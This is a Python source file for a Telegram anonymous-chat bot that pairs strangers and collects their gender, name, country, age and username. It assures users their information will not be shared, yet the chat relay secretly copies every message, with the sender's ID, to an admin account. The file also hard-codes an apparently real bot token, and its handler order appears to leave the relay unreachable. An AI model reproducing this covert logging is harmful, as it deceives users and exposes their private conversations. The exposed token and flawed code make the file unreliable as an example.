from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
import os

TOKEN = "7928530333:AAGexY_myc-Y3cpF0z36pwJnwHfcM1sRlCY"

# User data store
users = {}
chats = {}

# Admin Telegram ID (replace with your real ID)
ADMIN_ID = 123456789

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Boy", callback_data="gender_boy"),
         InlineKeyboardButton("Girl", callback_data="gender_girl")]
    ]
    await update.message.reply_text("👋 Welcome! Please select your gender:", reply_markup=InlineKeyboardMarkup(keyboard))

# Gender selection
async def gender_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    gender = "Boy" if "boy" in query.data else "Girl"
    user_id = query.from_user.id
    users[user_id] = {"gender": gender}
    await query.message.reply_text("✅ Gender saved. Now send me your Name:")
    return

# Name, Country, Age flow
async def info_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    text = update.message.text

    if user_id not in users:
        await update.message.reply_text("Please press /start first.")
        return

    user = users[user_id]

    if "name" not in user:
        user["name"] = text
        await update.message.reply_text("🌍 Now send your Country:")
    elif "country" not in user:
        user["country"] = text
        await update.message.reply_text("📆 Now send your Age:")
    elif "age" not in user:
        user["age"] = text
        await update.message.reply_text("🔐 This information will not be shared.\nDo you want to give your Telegram username? (send or skip)")
    elif "username" not in user:
        user["username"] = text if text.lower() != "skip" else "Not given"
        await update.message.reply_text("🔎 Finding random partner for you...\nPress /next to find or /stop to end chat.")
        chats[user_id] = None
    else:
        partner = find_partner(user_id)
        if partner:
            chats[user_id] = partner
            chats[partner] = user_id
            await context.bot.send_message(user_id, "👫 Partner found! Say Hi!")
            await context.bot.send_message(partner, "👫 Partner found! Say Hi!")
        else:
            await update.message.reply_text("🔄 No one available. Please wait or press /next again.")

def find_partner(user_id):
    for uid, val in chats.items():
        if uid != user_id and val is None:
            return uid
    return None

# Chat relay
async def chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id in chats and chats[user_id]:
        partner_id = chats[user_id]
        await context.bot.send_message(partner_id, f"{update.message.text}")

        # Admin logging (secret)
        await context.bot.send_message(ADMIN_ID, f"📩 Chat Log:\n{user_id}: {update.message.text}")
    else:
        await update.message.reply_text("❌ You are not in a chat. Use /next to find a partner.")

# Next command
async def next_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    old_partner = chats.get(user_id)
    if old_partner:
        chats[old_partner] = None
        await context.bot.send_message(old_partner, "🔁 Partner left. Use /next to find new partner.")
    chats[user_id] = None
    await update.message.reply_text("🔎 Searching again...")
    new_partner = find_partner(user_id)
    if new_partner:
        chats[user_id] = new_partner
        chats[new_partner] = user_id
        await context.bot.send_message(user_id, "✅ New partner found!")
        await context.bot.send_message(new_partner, "✅ New partner found!")
    else:
        await update.message.reply_text("😕 No one available yet.")

# Stop command
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    partner = chats.get(user_id)
    if partner:
        chats[partner] = None
        await context.bot.send_message(partner, "❌ Your partner left.")
    chats[user_id] = None
    await update.message.reply_text("🛑 Chat ended.")

# Show stats (for Admin)
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id == ADMIN_ID:
        boys = len([u for u in users.values() if u['gender'] == 'Boy'])
        girls = len([u for u in users.values() if u['gender'] == 'Girl'])
        await update.message.reply_text(f"📊 Stats:\nBoys: {boys}\nGirls: {girls}")
    else:
        await update.message.reply_text("❌ You’re not allowed!")

# Build app
app = ApplicationBuilder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(gender_handler))
app.add_handler(CommandHandler("next", next_command))
app.add_handler(CommandHandler("stop", stop_command))
app.add_handler(CommandHandler("stats", stats_command))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, info_handler))
app.add_handler(MessageHandler(filters.TEXT, chat_handler))

print("🤖 Bot is running...")
app.run_polling()
